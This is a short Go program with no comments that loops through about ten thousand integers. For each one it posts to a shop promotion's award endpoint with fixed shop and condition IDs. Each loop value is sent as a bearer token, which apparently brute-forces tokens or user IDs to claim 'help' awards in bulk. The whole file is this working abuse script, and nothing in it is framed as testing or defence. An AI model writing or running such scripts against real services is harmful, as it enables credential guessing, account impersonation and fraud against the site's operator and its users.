package main

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"strconv"
	"strings"
)

func main() {
	for i := 10000; i < 20000; i++ {
		sendPost2(i)

	}

}

func sendPost2(i int) {
	apiUrl := "https://user.ljyh.funwin.cn/TakeAward/userHelp"
	data := url.Values{}
	data.Set("shopId", "973610")
	data.Set("take_condition_id", "497")

	client := &http.Client{}
	r, _ := http.NewRequest("POST", apiUrl, strings.NewReader(data.Encode())) // URL-encoded payload
	r.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	r.Header.Add("Authorization", "Bearer "+strconv.Itoa(i))

	resp, err := client.Do(r)
	if err != nil {
		fmt.Println(err.Error())
		return
	}
	defer resp.Body.Close()

	body, _ := ioutil.ReadAll(resp.Body)
	fmt.Println(string(body))

}
